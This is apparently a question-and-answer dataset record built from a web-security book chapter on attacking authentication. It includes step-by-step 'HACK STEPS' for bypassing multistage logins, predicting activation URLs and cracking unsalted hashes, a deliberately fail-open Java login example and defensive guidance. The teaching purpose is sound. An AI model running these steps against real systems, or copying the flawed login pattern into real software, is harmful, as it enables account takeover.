passwords for other\napplication users.\n3. If passwords demonstrate a pattern that can be correlated with user-\nnames, you can try to log in using known or guessed usernames and the\ncorresponding inferred passwords.\n4. Otherwise, you can use the list of inferred passwords as the basis for a\nbrute-force attack with a list of enumerated or common usernames.\ncc0066..iinndddd 118833 88//1199//22001111 1122::0066::4400 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 184\n184 Chapter 6 n Attacking Authentication\nTRY IT!\nhttp://mdsec.net/auth/172/\nInsecure Distribution of Credentials\nMany applications employ a process in which credentials for newly created accounts\nare distributed to users out-of-band of their normal interaction with the applica-\ntion (for example, via post, e-mail, or SMS text message). Sometimes, this is done\nfor reasons motivated by security concerns, such as to provide assurance that\nthe postal or e-mail address supplied by the user actually belongs to that person.\nIn some cases, this process can present a security risk. For example, suppose\nthat the message distributed contains both username and password, there is\nno time limit on their use, and there is no requirement for the user to change\nthe password on fi rst login. It is highly likely that a large number, even the\nmajority, of application users will not modify their initial credentials and that\nthe distribution messages will remain in existence for a lengthy period, during\nwhich they may be accessed by an unauthorized party.\nSometimes, what is distributed is not the credentials themselves, but rather\nan “account activation” URL, which enables users to set their own initial pass-\nword. If the series of these URLs sent to successive users manifests any kind of\nsequence, an attacker can identify this by registering multiple users in close suc-\ncession and then infer the activation URLs sent to recent and forthcoming users.\nA related behavior by some web applications is to allow new users to register\naccounts in a seemingly secure manner and then to send a welcome e-mail to\neach new user containing his full login credentials. In the worst case, a security-\nconscious user who decides to immediately change his possibly compromised\npassword then receives another e-mail containing the new password “for future\nreference.” This behavior is so bizarre and unnecessary that users would be\nwell advised to stop using web applications that indulge in it.\n\nHACK STEPS\n1. Obtain a new account. If you are not required to set all credentials during\nregistration, determine the means by which the application distributes\ncredentials to new users.\n2. If an account activation URL is used, try to register several new accounts\nin close succession, and identify any sequence in the URLs you receive.\nIf a pattern can be determined, try to predict the activation URLs sent to\nrecent and forthcoming users, and attempt to use these URLs to take own-\nership of their accounts.\n3. Try to reuse a single activation URL multiple times, and see if the applica-\ntion allows this. If not, try locking out the target account before reusing\nthe URL, and see if it now works.\ncc0066..iinndddd 118844 88//1199//22001111 1122::0066::4400 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 185\nChapter 6 n Attacking Authentication 185\nImplementation Flaws in Authentication\nEven a well-designed authentication mechanism may be highly insecure due to\nmistakes made in its implementation. These mistakes may lead to information\nleakage, complete login bypassing, or a weakening of the overall security of\nthe mechanism as designed. Implementation fl aws tend to be more subtle and\nharder to detect than design defects such as poor-quality passwords and brute-\nforcibility. For this reason, they are often a fruitful target for attacks against\nthe most security-critical applications, where numerous threat models and\npenetration tests are likely to have claimed any low-hanging fruit. The authors\nhave identifi ed each of the implementation fl aws described here within the web\napplications deployed by large banks.\nFail-Open Login Mechanisms\nFail-open logic is a species of logic fl aw (described in detail in Chapter 11) that has\nparticularly serious consequences in the context of authentication mechanisms.\nThe following is a fairly contrived example of a login mechanism that fails\nopen. If the call to db.getUser() throws an exception for some reason (for\nexample, a null pointer exception arising because the user’s request did not\ncontain a username or password parameter), the login succeeds. Although the\nresulting session may not be bound to a particular user identity and therefore\nmay not be fully functional, this may still enable an attacker to access some\nsensitive data or functionality.\npublic Response checkLogin(Session session) {\ntry {\nString uname = session.getParameter(“username”);\nString passwd = session.getParameter(“password”);\nUser user = db.getUser(uname, passwd);\nif (user == null) {\n// invalid credentials\nsession.setMessage(“Login failed. “);\nreturn doLogin(session);\n}\n}\ncatch (Exception e) {}\n// valid user\nsession.setMessage(“Login successful. “);\nreturn doMainMenu(session);\n}\nIn the fi eld, you would not expect code like this to pass even the most cursory\nsecurity review. However, the same conceptual fl aw is much more likely to exist\nin more complex mechanisms in which numerous layered method invocations\ncc0066..iinndddd 118855 88//1199//22001111 1122::0066::4400 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 186\n186 Chapter 6 n Attacking Authentication\nare made, in which many potential errors may arise and be handled in different\nplaces, and where the more complicated validation logic may involve maintain-\ning signifi cant state about the login’s progress.\n\nHACK STEPS\n1. Perform a complete, valid login using an account you control. Record\nevery piece of data submitted to the application, and every response\nreceived, using your intercepting proxy.\n2. Repeat the login process numerous times, modifying pieces of the data\nsubmitted in unexpected ways. For example, for each request parameter\nor cookie sent by the client, do the following:\na. Submit an empty string as the value.\nb. Remove the name/value pair altogether.\nc. Submit very long and very short values.\nd. Submit strings instead of numbers and vice versa.\ne. Submit the same item multiple times, with the same and different\nvalues.\n3. For each malformed request submitted, review closely the application’s\nresponse to identify any divergences from the base case.\n4. Feed these observations back into framing your test cases. When one\nmodification causes a change in behavior, try to combine this with other\nchanges to push the application’s logic to its limits.\nTRY IT!\nhttp://mdsec.net/auth/300/\nDefects in Multistage Login Mechanisms\nSome applications use elaborate login mechanisms involving multiple stages,\nsuch as the following:\nn Entry of a username and password\nn A challenge for specifi c digits from a PIN or a memorable word\nn The submission of a value displayed on a changing physical token\nMultistage login mechanisms are designed to provide enhanced security over\nthe simple model based on username and password. Typically, the fi rst stage\nrequires the users to identify themselves with a username or similar item, and\nsubsequent stages perform various authentication checks. Such mechanisms\ncc0066..iinndddd 118866 88//1199//22001111 1122::0066::4400 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 187\nChapter 6 n Attacking Authentication 187\nfrequently contain security vulnerabilities — in particular, various logic fl aws\n(see Chapter 11).",
    "question": "What are the common design and implementation flaws in web application authentication mechanisms that can be exploited by attackers to gain unauthorized access?",
    "summary": "Authentication is a critical but often overlooked security mechanism in web applications, serving as the first line of defense against unauthorized access. However, it is frequently the weakest link, as many vulnerabilities in its design or implementation can allow attackers to bypass security measures and gain full access to user data. This chapter explores common flaws in authentication systems, including weak password policies, brute-force attacks, verbose error messages, insecure credential transmission, and issues with username and password validation, all of which can be exploited to compromise an application's security."
  },
  {
    "start": 153,
    "end": 165,
    "text": "COMMON MYTH\nIt is often assumed that multistage login mechanisms are less prone to secu-\nrity bypasses than standard username/password authentication. This belief\nis mistaken. Performing several authentication checks may add considerable\nsecurity to the mechanism. But counterbalancing this, the process is more\nprone to fl aws in implementation. In several cases where a combination of\nfl aws is present, it can even result in a solution that is less secure than a nor-\nmal login based on username and password.\nSome implementations of multistage login mechanisms make potentially\nunsafe assumptions at each stage about the user’s interaction with earlier stages:\nn An application may assume that a user who accesses stage three must\nhave cleared stages one and two. Therefore, it may authenticate an attacker\nwho proceeds directly from stage one to stage three and correctly com-\npletes it, enabling an attacker to log in with only one part of the various\ncredentials normally required.\nn An application may trust some of the data being processed at stage two\nbecause this was validated at stage one. However, an attacker may be able\nto manipulate this data at stage two, giving it a different value than was\nvalidated at stage one. For example, at stage one the application might\ndetermine whether the user’s account has expired, is locked out, or is in\nthe administrative group, or whether it needs to complete further stages\nof the login beyond stage two. If an attacker can interfere with these\nfl ags as the login transitions between different stages, he may be able to\nmodify the application’s behavior and cause it to authenticate him with\nonly partial credentials or otherwise elevate privileges.\nn An application may assume that the same user identity is used to complete\neach stage; however, it might not explicitly check this. For example, stage\none might involve submitting a valid username and password, and stage\ntwo might involve resubmitting the username (now in a hidden form\nfi eld) and a value from a changing physical token. If an attacker submits\nvalid data pairs at each stage, but for different users, the application might\nauthenticate the user as either one of the identities used in the two stages.\nThis would enable an attacker who possesses his own physical token and\ndiscovers another user’s password to log in as that user (or vice versa).\nAlthough the login mechanism cannot be completely compromised with-\nout any prior information, its overall security posture is substantially\nweakened, and the substantial expense and effort of implementing the\ntwo-factor mechanism do not deliver the benefi ts expected.\ncc0066..iinndddd 118877 88//1199//22001111 1122::0066::4400 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 188\n188 Chapter 6 n Attacking Authentication\n\nHACK STEPS\n1. Perform a complete, valid login using an account you control. Record every\npiece of data submitted to the application using your intercepting proxy.\n2. Identify each distinct stage of the login and the data that is collected at\neach stage. Determine whether any single piece of information is collected\nmore than once or is ever transmitted back to the client and resubmitted\nvia a hidden form field, cookie, or preset URL parameter (see Chapter 5).\n3. Repeat the login process numerous times with various malformed\nrequests:\na. Try performing the login steps in a different sequence.\nb. Try proceeding directly to any given stage and continuing from there.\nc. Try skipping each stage and continuing with the next.\nd. Use your imagination to think of other ways to access the different\nstages that the developers may not have anticipated.\n4. If any data is submitted more than once, try submitting a different value\nat different stages, and see whether the login is still successful. It may\nbe that some of the submissions are superfluous and are not actually\nprocessed by the application. It might be that the data is validated at one\nstage and then trusted subsequently. In this instance, try to provide the\ncredentials of one user at one stage, and then switch at the next to actu-\nally authenticate as a different user. It might be that the same piece of\ndata is validated at more than one stage, but against different checks. In\nthis instance, try to provide (for example) the username and password of\none user at the first stage, and the username and PIN of a different user\nat the second stage.\n5. Pay close attention to any data being transmitted via the client that was\nnot directly entered by the user. The application may use this data to store\ninformation about the state of the login progress, and the application may\ntrust it when it is submitted back to the server. For example, if the request\nfor stage three includes the parameter stage2complete=true, it may\nbe possible to advance straight to stage three by setting this value. Try to\nmodify the values being submitted, and determine whether this enables\nyou to advance or skip stages.\nTRY IT!\nhttp://mdsec.net/auth/195/\nhttp://mdsec.net/auth/199/\nhttp://mdsec.net/auth/203/\nhttp://mdsec.net/auth/206/\nhttp://mdsec.net/auth/211/\ncc0066..iinndddd 118888 88//1199//22001111 1122::0066::4400 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 189\nChapter 6 n Attacking Authentication 189\nSome login mechanisms employ a randomly varying question at one of the stages\nof the login process. For example, after submitting a username and password, users\nmight be asked one of various “secret” questions (regarding their mother’s maiden\nname, place of birth, name of fi rst school) or to submit two random letters from a\nsecret phrase. The rationale for this behavior is that even if an attacker captures\neverything that a user enters on a single occasion, this will not enable him to log\nin as that user on a different occasion, because different questions will be asked.\nIn some implementations, this functionality is broken and does not achieve\nits objectives:\nn The application may present a randomly chosen question and store the\ndetails within a hidden HTML form fi eld or cookie, rather than on the\nserver. The user subsequently submits both the answer and the question\nitself. This effectively allows an attacker to choose which question to\nanswer, enabling the attacker to repeat a login after capturing a user’s\ninput on a single occasion.\nn The application may present a randomly chosen question on each login\nattempt but not remember which question a given user was asked if he\nor she fails to submit an answer. If the same user initiates a fresh login\nattempt a moment later, a different random question is generated. This\neffectively allows an attacker to cycle through questions until he receives\none to which he knows the answer, enabling him to repeat a login having\ncaptured a user’s input on a single occasion.\nNOTE The second of these conditions is really quite subtle, and as a result,\nmany real-world applications are vulnerable. An application that challenges a\nuser for two random letters of a memorable word may appear at fi rst glance\nto be functioning properly and providing enhanced security. However, if the\nletters are randomly chosen each time the previous authentication stage is\npassed, an attacker who has captured a user’s login on a single occasion can\nsimply reauthenticate up to this point until the two letters that he knows are\nrequested, without the risk of account lockout.\n\nHACK STEPS\n1. If one of the login stages uses a randomly varying question, verify whether\nthe details of the question are being submitted together with the answer.\nIf so, change the question, submit the correct answer associated with that\nquestion, and verify whether the login is still successful.\n2. If the application does not enable an attacker to submit an arbitrary\nquestion and answer, perform a partial login several times with a single\naccount, proceeding each time as far as the varying question. If the ques-\ntion changes on each occasion, an attacker can still effectively choose\nwhich question to answer.\ncc0066..iinndddd 118899 88//1199//22001111 1122::0066::4411 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 190\n190 Chapter 6 n Attacking Authentication\nTRY IT!\nhttp://mdsec.net/auth/178/\nhttp://mdsec.net/auth/182/\nNOTE In some applications where one component of the login varies ran-\ndomly, the application collects all of a user’s credentials at a single stage.\nFor example, the main login page may present a form containing fi elds for\nusername, password, and one of various secret questions. Each time the\nlogin page is loaded, the secret question changes. In this situation, the ran-\ndomness of the secret question does nothing to prevent an attacker from\nreplaying a valid login request having captured a user’s input on one occa-\nsion. The login process cannot be modifi ed to do so in its present form,\nbecause an attacker can simply reload the page until he receives the varying\nquestion to which he knows the answer. In a variation on this scenario, the\napplication may set a persistent cookie to “ensure” that the same varying\nquestion is presented to any given user until that person answers it cor-\nrectly. Of course, this measure can be circumvented easily by modifying or\ndeleting the cookie.\nInsecure Storage of Credentials\nIf an application stores login credentials insecurely, the security of the login\nmechanism is undermined, even though there may be no inherent fl aw in the\nauthentication process itself.\nIt is common to encounter web applications in which user credentials are\nstored insecurely within the database. This may involve passwords being\nstored in cleartext. But if passwords are being hashed using a standard algo-\nrithm such as MD5 or SHA-1, this still allows an attacker to simply look up\nobserved hashes against a precomputed database of hash values. Because the\ndatabase account used by the application must have full read/write access to\nthose credentials, many other kinds of vulnerabilities within the application\nmay be exploitable to enable you to access these credentials, such as command\nor SQL injection fl aws (see Chapter 9) and access control weaknesses (see\nChapter 8).\nTIP Some online databases of common hashing functions are available here:\nhttp://passcracking.com/index.php\nhttp://authsecu.com/decrypter-dechiffrer-cracker-hash-md5/\nscript-hash-md5.php\ncc0066..iinndddd 119900 88//1199//22001111 1122::0066::4411 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 191\nChapter 6 n Attacking Authentication 191\n\nHACK STEPS\n1. Review all of the application’s authentication-related functionality, as well\nas any functions relating to user maintenance. If you find any instances in\nwhich a user’s password is transmitted back to the client, this indicates\nthat passwords are being stored insecurely, either in cleartext or using\nreversible encryption.\n2. If any kind of arbitrary command or query execution vulnerability is\nidentified within the application, attempt to find the location within the\napplication’s database or filesystem where user credentials are stored:\na. Query these to determine whether passwords are being stored in\nunencrypted form.\nb. If passwords are stored in hashed form, check for nonunique val-\nues, indicating that an account has a common or default password\nassigned, and that the hashes are not being salted.\nc. If the password is hashed with a standard algorithm in unsalted form,\nquery online hash databases to determine the corresponding cleartext\npassword value.\nSecuring Authentication\nImplementing a secure authentication solution involves attempting to simultane-\nously meet several key security objectives, and in many cases trade off against\nother objectives such as functionality, usability, and total cost. In some cases\n“more” security can actually be counterproductive. For example, forcing users\nto set very long passwords and change them frequently often causes users to\nwrite down their passwords.\nBecause of the enormous variety of possible authentication vulnerabilities,\nand the potentially complex defenses that an application may need to deploy to\nmitigate against all of them, many application designers and developers choose\nto accept certain threats as a given and concentrate on preventing the most seri-\nous attacks. Here are some factors to consider in striking an appropriate balance:\nn The criticality of security given the functionality that the application offers\nn The degree to which users will tolerate and work with different types of\nauthentication controls\nn The cost of supporting a less user-friendly system\nn The fi nancial cost of competing alternatives in relation to the revenue likely\nto be generated by the application or the value of the assets it protects\ncc0066..iinndddd 119911 88//1199//22001111 1122::0066::4411 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 192\n192 Chapter 6 n Attacking Authentication\nThis section describes the most effective ways to defeat the various attacks\nagainst authentication mechanisms. We’ll leave it to you to decide which kinds\nof defenses are most appropriate in each case.\nUse Strong Credentials\nn Suitable minimum password quality requirements should be enforced.\nThese may include rules regarding minimum length; the appearance of\nalphabetic, numeric, and typographic characters; the appearance of both\nuppercase and lowercase characters; the avoidance of dictionary words,\nnames, and other common passwords; preventing a password from being\nset to the username; and preventing a similarity or match with previ-\nously set passwords. As with most security measures, different password\nquality requirements may be appropriate for different categories of user.\nn Usernames should be unique.\nn Any system-generated usernames and passwords should be created\nwith suffi cient entropy that they cannot feasibly be sequenced or pre-\ndicted — even by an attacker who gains access to a large sample of suc-\ncessively generated instances.\nn Users should be permitted to set suffi ciently strong passwords. For example,\nlong passwords and a wide range of characters should be allowed.\nHandle Credentials Secretively\nn All credentials should be created, stored, and transmitted in a manner\nthat does not lead to unauthorized disclosure.\nn All client-server communications should be protected using a well-\nestablished cryptographic technology, such as SSL. Custom solutions\nfor protecting data in transit are neither necessary nor desirable.\nn If it is considered preferable to use HTTP for the unauthenticated areas of\nthe application, ensure that the login form itself is loaded using HTTPS,\nrather than switching to HTTPS at the point of the login submission.\nn OnlyPOST requests should be used to transmit credentials to the server.\nCredentials should never be placed in URL parameters or cookies (even\nephemeral ones). Credentials should never be transmitted back to the\nclient, even in parameters to a redirect.\nn All server-side application components should store credentials in a man-\nner that does not allow their original values to be easily recovered, even\nby an attacker who gains full access to all the relevant data within the\ncc0066..iinndddd 119922 88//1199//22001111 1122::0066::4411 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 193\nChapter 6 n Attacking Authentication 193\napplication’s database. The usual means of achieving this objective is to\nuse a strong hash function (such as SHA-256 at the time of this writing),\nappropriately salted to reduce the effectiveness of precomputed offl ine\nattacks. The salt should be specifi c to the account that owns the password,\nsuch that an attacker cannot replay or substitute hash values.\nn Client-side “remember me” functionality should in general remember only\nnonsecret items such as usernames. In less security-critical applications,\nit may be considered appropriate to allow users to opt in to a facility to\nremember passwords. In this situation, no cleartext credentials should be\nstored on the client (the password should be stored reversibly encrypted\nusing a key known only to the server). Also, users should be warned about\nrisks from an attacker who has physical access to their computer or who\ncompromises their computer remotely. Particular attention should be paid\nto eliminating cross-site scripting vulnerabilities within the application\nthat may be used to steal stored credentials (see Chapter 12).\nn A password change facility should be implemented (see the “Prevent\nMisuse of the Password Change Function” section), and users should be\nrequired to change their password periodically.\nn Where credentials for new accounts are distributed to users out-of-band,\nthese should be sent as securely as possible and should be time-limited.\nThe user should be required to change them on fi rst login and should be\ntold to destroy the communication after fi rst use.\nn Where applicable, consider capturing some of the user’s login information\n(for example, single letters from a memorable word) using drop-down\nmenus rather than text fi elds. This will prevent any keyloggers installed\non the user’s computer from capturing all the data the user submits. (Note,\nhowever, that a simple keylogger is only one means by which an attacker\ncan capture user input. If he or she has already compromised a user’s\ncomputer, in principle an attacker can log every type of event, including\nmouse movements, form submissions over HTTPS, and screen captures.)\nValidate Credentials Properly\nn Passwords should be validated in full — that is, in a case-sensitive way,\nwithout fi ltering or modifying any characters, and without truncating\nthe password.\nn The application should be aggressive in defending itself against unex-\npected events occurring during login processing. For example, depending\non the development language in use, the application should use catch-all\nexception handlers around all API calls. These should explicitly delete all\ncc0066..iinndddd 119933 88//1199//22001111 1122::0066::4411 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 194\n194 Chapter 6 n Attacking Authentication\nsession and method-local data being used to control the state of the login\nprocessing and should explicitly invalidate the current session, thereby\ncausing a forced logout by the server even if authentication is somehow\nbypassed.\nn All authentication logic should be closely code-reviewed, both as pseudo-\ncode and as actual application source code, to identify logic errors such\nas fail-open conditions.\nn If functionality to support user impersonation is implemented, this should\nbe strictly controlled to ensure that it cannot be misused to gain unau-\nthorized access. Because of the criticality of the functionality, it is often\nworthwhile to remove this functionality from the public-facing applica-\ntion and implement it only for internal administrative users, whose use\nof impersonation should be tightly controlled and audited.\nn Multistage logins should be strictly controlled to prevent an attacker from\ninterfering with the transitions and relationships between the stages:\nn All data about progress through the stages and the results of previous\nvalidation tasks should be held in the server-side session object and\nshould never be transmitted to or read from the client.\nn No items of information should be submitted more than once by the\nuser, and there should be no means for the user to modify data that\nhas already been collected and/or validated. Where an item of data\nsuch as a username is used at multiple stages, this should be stored\nin a session variable when fi rst collected and referenced from there\nsubsequently.\nn The fi rst task carried out at every stage should be to verify that all\nprior stages have been correctly completed. If this is not the case, the\nauthentication attempt should immediately be marked as bad.\nn To prevent information leakage about which stage of the login failed\n(which would enable an attacker to target each stage in turn), the appli-\ncation should always proceed through all stages of the login, even\nif the user failed to complete earlier stages correctly, and even if the\noriginal username was invalid. After proceeding through all the stages,\nthe application should present a generic “login failed” message at the\nconclusion of the fi nal stage, without providing any information about\nwhere the failure occurred.\nn Where a login process includes a randomly varying question, ensure that\nan attacker cannot effectively choose his own question:\nn Always employ a multistage process in which users identify themselves\nat an initial stage and the randomly varying question is presented to\nthem at a later stage.\ncc0066..iinndddd 119944 88//1199//22001111 1122::0066::4411 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 195\nChapter 6 n Attacking Authentication 195\nn When a given user has been presented with a given varying question,\nstore that question within her persistent user profi le, and ensure that\nthe same user is presented with the same question on each attempted\nlogin until she successfully answers it.\nn When a randomly varying challenge is presented to the user, store the\nquestion that has been asked in a server-side session variable, rather\nthan a hidden fi eld in an HTML form, and validate the subsequent\nanswer against that saved question.\nNOTE The subtleties of devising a secure authentication mechanism run\ndeep here. If care is not taken in the asking of a randomly varying question,\nthis can lead to new opportunities for username enumeration. For example, to\nprevent an attacker from choosing his own question, an application may store\nwithin each user’s profi le the last question that user was asked, and continue\npresenting that question until the user answers it correctly. An attacker who\ninitiates several logins using any given user’s username will be met with the\nsame question. However, if the attacker carries out the same process using\nan invalid username, the application may behave differently: because no\nuser profi le is associated with an invalid username, there will be no stored\nquestion, so a varying question will be presented. The attacker can use this\ndifference in behavior, manifested across several login attempts, to infer the\nvalidity of a given username. In a scripted attack, he will be able to harvest\nnumerous usernames quickly.\nIf an application wants to defend itself against this possibility, it must go to\nsome lengths. When a login attempt is initiated with an invalid username, the\napplication must record somewhere the random question that it presented\nfor that invalid username and ensure that subsequent login attempts using\nthe same username are met with the same question. Going even further, the\napplication could switch to a different question periodically to simulate the\nnonexistent user’s having logged in as normal, resulting in a change in the\nnext question! At some point, however, the application designer must draw a\nline and concede that a total victory against such a determined attacker prob-\nably is not possible.\nPrevent Information Leakage\nn The various authentication mechanisms used by the application should\nnot disclose any information about authentication parameters, through\neither overt messages or inference from other aspects of the application’s\nbehavior. An attacker should have no means of determining which piece\nof the various items submitted has caused a problem.\nn A single code component should be responsible for responding to all failed\nlogin attempts with a generic message. This avoids a subtle vulnerability\ncc0066..iinndddd 119955 88//1199//22001111 1122::0066::4411 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 196\n196 Chapter 6 n Attacking Authentication\nthat can occur when a supposedly uninformative message returned from\ndifferent code paths can actually be spotted by an attacker due to typo-\ngraphical differences in the message, different HTTP status codes, other\ninformation hidden in HTML, and the like.\nn If the application enforces some kind of account lockout to prevent brute-\nforce attacks (as discussed in the next section), be careful not to let this\nlead to any information leakage. For example, if an application discloses\nthat a specifi c account has been suspended for X minutes due to Y failed\nlogins, this behavior can easily be used to enumerate valid usernames. In\naddition, disclosing the precise metrics of the lockout policy enables an\nattacker to optimize any attempt to continue guessing passwords in spite\nof the policy. To avoid enumeration of usernames, the application should\nrespond to any series of failed login attempts from the same browser with a\ngeneric message advising that accounts are suspended if multiple failures\noccur and that the user should try again later. This can be achieved using a\ncookie or hidden fi eld to track repeated failures originating from the same\nbrowser. (Of course, this mechanism should not be used to enforce any\nactual security control — only to provide a helpful message to ordinary\nusers who are struggling to remember their credentials.)\nn If the application supports self-registration, it can prevent this function\nfrom being used to enumerate existing usernames in two ways:\nn Instead of permitting self-selection of usernames, the application can\ncreate a unique (and unpredictable) username for each new user, thereby\nobviating the need to disclose that a selected username already exists.\nn The application can use e-mail addresses as usernames. Here, the\nfi rst stage of the registration process requires the user to enter her\ne-mail address, whereupon she is told simply to wait for an e-mail\nand follow the instructions contained within it. If the e-mail address\nis already registered, the user can be informed of this in the e-mail. If\nthe address is not already registered, the user can be provided with a\nunique, unguessable URL to visit to continue the registration process.\nThis prevents the attacker from enumerating valid usernames (unless\nhe happens to have already compromised a large number of e-mail\naccounts).\nPrevent Brute-Force Attacks\nn Measures need to be enforced within all the various challenges imple-\nmented by the authentication functionality to prevent attacks that attempt\nto meet those challenges using automation. This includes the login itself,\ncc0066..iinndddd 119966 88//1199//22001111 1122::0066::4411 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 197\nChapter 6 n Attacking Authentication 197\nas well as functions to change the password, to recover from a forgotten\npassword situation, and the like.\nn Using unpredictable usernames and preventing their enumeration presents\na signifi cant obstacle to completely blind brute-force attacks and requires\nan attacker to have somehow discovered one or more specifi c usernames\nbefore mounting an attack.\nn Some security-critical applications (such as online banks) simply disable\nan account after a small number of failed logins (such as three). They also\nrequire that the account owner take various out-of-band steps to reactivate\nthe account, such as telephoning customer support and answering a series\nof security questions. Disadvantages of this policy are that it allows an\nattacker to deny service to legitimate users by repeatedly disabling their\naccounts, and the cost of providing the account recovery service. A more\nbalanced policy, suitable for most security-aware applications, is to sus-\npend accounts for a short period (such as 30 minutes) following a small\nnumber of failed login attempts (such as three). This serves to massively\nslow down any password-guessing attack, while mitigating the risk of\ndenial-of-service attacks and also reducing call center work.\nn If a policy of temporary account suspension is implemented, care should\nbe taken to ensure its effectiveness:\nn To prevent information leakage leading to username enumeration, the\napplication should never indicate that any specifi c account has been\nsuspended. Rather, it should respond to any series of failed logins,\neven those using an invalid username, with a message advising that\naccounts are suspended if multiple failures occur and that the user\nshould try again later (as just discussed).\nn The policy’s metrics should not be disclosed to users. Simply telling\nlegitimate users to “try again later” does not seriously diminish their\nquality of service. But informing an attacker exactly how many failed\nattempts are tolerated, and how long the suspension period is, enables\nhim to optimize any attempt to continue guessing passwords in spite\nof the policy.\nn If an account is suspended, login attempts should be rejected without\neven checking the credentials. Some applications that have imple-\nmented a suspension policy remain vulnerable to brute-forcing because\nthey continue to fully process login attempts during the suspension\nperiod, and they return a subtly (or not so subtly) different mes-\nsage when valid credentials are submitted. This behavior enables\nan effective brute-force attack to proceed at full speed regardless of\nthe suspension policy.\ncc0066..iinndddd 119977 88//1199//22001111 1122::0066::4422 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 198\n198 Chapter 6 n Attacking Authentication\nn Per-account countermeasures such as account lockout do not help protect\nagainst one kind of brute-force attack that is often highly effective — iterat-\ning through a long list of enumerated usernames, checking a single weak\npassword, such as password. For example, if fi ve failed attempts trigger\nan account suspension, this means an attacker can attempt four different\npasswords on every account without causing any disruption to users. In\na typical application containing many weak passwords, such an attacker\nis likely to compromise many accounts.\nThe effectiveness of this kind of attack will, of course, be massively reduced\nif other areas of the authentication mechanism are designed securely. If\nusernames cannot be enumerated or reliably predicted, an attacker will\nbe slowed down by the need to perform a brute-force exercise in guessing\nusernames. And if strong requirements are in place for password quality,\nit is far less likely that the attacker will choose a password for testing that\neven a single user of the application has chosen.\nIn addition to these controls, an application can specifi cally protect itself\nagainst this kind of attack through the use of CAPTCHA (Completely\nAutomated Public Turing test to tell Computers and Humans Apart)\nchallenges on every page that may be a target for brute-force attacks (see\nFigure 6-9). If effective, this measure can prevent any automated submission\nof data to any application page, thereby keeping all kinds of password-\nguessing attacks from being executed manually. Note that much research\nhas been done on CAPTCHA technologies, and automated attacks against\nthem have in some cases been reliable. Furthermore, some attackers have\nbeen known to devise CAPTCHA-solving competitions, in which unwit-\nting members of the public are leveraged as drones to assist the attacker.\nHowever, even if a particular kind of challenge is not entirely effective, it\nwill still lead most casual attackers to desist and fi nd an application that\ndoes not employ the technique.\nFigure 6-9: A CAPTCHA control\ndesigned to hinder automated attacks\nTIP If you are attacking an application that uses CAPTCHA controls to hin-\nder automation, always closely review the HTML source for the page where\nthe image appears. The authors have encountered cases where the solution\ncc0066..iinndddd 119988 88//1199//22001111 1122::0066::4422 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 199\nChapter 6 n Attacking Authentication 199\nto the puzzle appears in literal form within the ALT attribute of the image\ntag, or within a hidden form fi eld, enabling a scripted attack to defeat the\nprotection without actually solving the puzzle itself.\nPrevent Misuse of the Password Change Function\nn A password change function should always be implemented, to allow\nperiodic password expiration (if required) and to allow users to change\npasswords if they want to for any reason. As a key security mechanism,\nthis needs to be well defended against misuse.\nn The function should be accessible only from within an authenticated session.\nn There should be no facility to provide a username, either explicitly or via\na hidden form fi eld or cookie. Users have no legitimate need to attempt\nto change other people’s passwords.\nn As a defense-in-depth measure, the function should be protected from\nunauthorized access gained via some other security defect in the applica-\ntion — such as a session-hijacking vulnerability, cross-site scripting, or\neven an unattended terminal. To this end, users should be required to\nreenter their existing password.\nn The new password should be entered twice to prevent mistakes. The appli-\ncation should compare the “new password” and “confi rm new password”\nfi elds as its fi rst step and return an informative error if they do not match.\nn The function should prevent the various attacks that can be made against\nthe main login mechanism. A single generic error message should be used\nto notify users of any error in existing credentials, and the function should\nbe temporarily suspended following a small number of failed attempts\nto change the password.\nn Users should be notifi ed out-of-band (such as via e-mail) that their pass-\nword has been changed, but the message should not contain either their\nold or new credentials.\nPrevent Misuse of the Account Recovery Function\nn In the most security-critical applications, such as online banking, account\nrecovery in the event of a forgotten password is handled out-of-band. A\nuser must make a telephone call and answer a series of security questions,\nand new credentials or a reactivation code are also sent out-of-band (via\nconventional mail) to the user’s registered home address. The majority of\napplications do not want or need this level of security, so an automated\nrecovery function may be appropriate.\ncc0066..iinndddd 119999 88//1199//22001111 1122::0066::4422 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 200\n200 Chapter 6 n Attacking Authentication\nn A well-designed password recovery mechanism needs to prevent accounts\nfrom being compromised by an unauthorized party and minimize any\ndisruption to legitimate users.\nn Features such as password “hints” should never be used, because they\nmainly help an attacker trawl for accounts that have obvious hints set.\nn The best automated solution for enabling users to regain control of accounts\nis to e-mail the user a unique, time-limited, unguessable, single-use recov-\nery URL. This e-mail should be sent to the address that the user provided\nduring registration. Visiting the URL allows the user to set a new pass-\nword. After this has been done, a second e-mail should be sent, indicating\nthat a password change was made. To prevent an attacker from denying\nservice to users by continually requesting password reactivation e-mails,\nthe user’s existing credentials should remain valid until they are changed.\nn To further protect against unauthorized access, applications may present\nusers with a secondary challenge that they must complete before gain-\ning access to the password reset function. Be sure that the design of this\nchallenge does not introduce new vulnerabilities:\nn The challenge should implement the same question or set of ques-\ntions for everyone, mandated by the application during registration.\nIf users provide their own challenge, it is likely that some of these will\nbe weak, and this also enables an attacker to enumerate valid accounts\nby identifying those that have a challenge set.\nn Responses to the challenge should contain suffi cient entropy that they\ncannot be easily guessed. For example, asking the user for the name of\nhis fi rst school is preferable to asking for his favorite color.\nn Accounts should be temporarily suspended following a number of\nfailed attempts to complete the challenge, to prevent brute-force attacks.\nn The application should not leak any information in the event of failed\nresponses to the challenge — regarding the validity of the username,\nany suspension of the account, and so on.\nn Successful completion of the challenge should be followed by the\nprocess described previously, in which a message is sent to the user’s\nregistered e-mail address containing a reactivation URL. Under no\ncircumstances should the application disclose the user’s forgotten\npassword or simply drop the user into an authenticated session. 